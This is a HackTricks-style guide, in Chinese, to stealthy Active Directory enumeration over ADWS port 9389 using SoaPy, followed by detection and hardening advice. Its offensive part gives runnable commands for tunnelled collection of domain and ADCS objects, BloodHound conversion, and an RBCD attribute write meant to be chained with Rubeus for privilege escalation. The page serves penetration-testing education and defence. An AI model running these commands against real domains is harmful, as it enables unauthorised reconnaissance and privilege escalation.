# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## 什么是 ADWS？

Active Directory Web Services (ADWS) 是 **自 Windows Server 2008 R2 起在每个域控制器上默认启用**，并监听 TCP **9389**。尽管名称中有“HTTP”，但 **并不涉及 HTTP**。相反，该服务通过一系列专有的 .NET 框架协议暴露 LDAP 风格的数据：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧中，并通过一个不常用的端口传输，**通过 ADWS 进行枚举的可能性远低于经典的 LDAP/389 和 636 流量被检查、过滤或签名**。对于操作员来说，这意味着：

* 更隐蔽的侦察 – 蓝队通常集中于 LDAP 查询。
* 通过 SOCKS 代理在 **非 Windows 主机（Linux, macOS）** 上隧道 9389/TCP 的自由收集。
* 您可以通过 LDAP 获得的相同数据（用户、组、ACL、架构等），并能够执行 **写入**（例如 `msDs-AllowedToActOnBehalfOfOtherIdentity` 用于 **RBCD**）。

> 注意：ADWS 也被许多 RSAT GUI/PowerShell 工具使用，因此流量可能与合法的管理员活动混合。

## SoaPy – 原生 Python 客户端

[SoaPy](https://github.com/logangoins/soapy) 是 **用纯 Python 完全重新实现的 ADWS 协议栈**。它逐字节构建 NBFX/NBFSE/NNS/NMF 帧，允许从类 Unix 系统收集数据而不接触 .NET 运行时。

### 主要特性

* 支持 **通过 SOCKS 代理**（对 C2 植入有用）。
* 与 LDAP `-q '(objectClass=user)'` 相同的细粒度搜索过滤器。
* 可选的 **写入** 操作（ `--set` / `--delete` ）。
* **BOFHound 输出模式**，可直接导入 BloodHound。
* `--parse` 标志在需要人类可读性时美化时间戳 / `userAccountControl`。

### 安装（操作员主机）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

以下工作流程展示了如何通过 ADWS 枚举 **域和 ADCS 对象**，将其转换为 BloodHound JSON，并寻找基于证书的攻击路径 – 所有操作均在 Linux 上进行：

1. **从目标网络到你的机器隧道 9389/TCP**（例如通过 Chisel、Meterpreter、SSH 动态端口转发等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080` 或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集根域对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从配置 NC 收集与 ADCS 相关的对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **在 BloodHound GUI 中上传 ZIP** 并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 以揭示证书升级路径 (ESC1, ESC8 等)。

### 编写 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将其与 `s4u2proxy`/`Rubeus /getticket` 结合，以形成完整的 **基于资源的受限委派** 链。

## 检测与加固

### 详细的 ADDS 日志记录

在域控制器上启用以下注册表项，以显示来自 ADWS（和 LDAP）的昂贵/低效搜索：
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
事件将出现在 **Directory-Service** 下，带有完整的 LDAP 过滤器，即使查询是通过 ADWS 到达的。

### SACL Canary Objects

1. 创建一个虚拟对象（例如，禁用用户 `CanaryUser`）。
2. 为 _Everyone_ 主体添加一个 **Audit** ACE，审核 **ReadProperty**。
3. 每当攻击者执行 `(servicePrincipalName=*)`、`(objectClass=user)` 等操作时，DC 会发出 **Event 4662**，其中包含真实用户 SID——即使请求是代理的或源自 ADWS。

Elastic 预构建规则示例：
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## 工具总结

| 目的 | 工具 | 备注 |
|------|------|------|
| ADWS 枚举 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 读/写 |
| BloodHound 导入 | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| 证书泄露 | [Certipy](https://github.com/ly4k/Certipy) | 可以通过同一 SOCKS 代理 |

## 参考文献

* [SpecterOps – 确保使用 SOAP(y) – 操作员指南，使用 ADWS 进行隐秘的 AD 收集](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF 规范](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
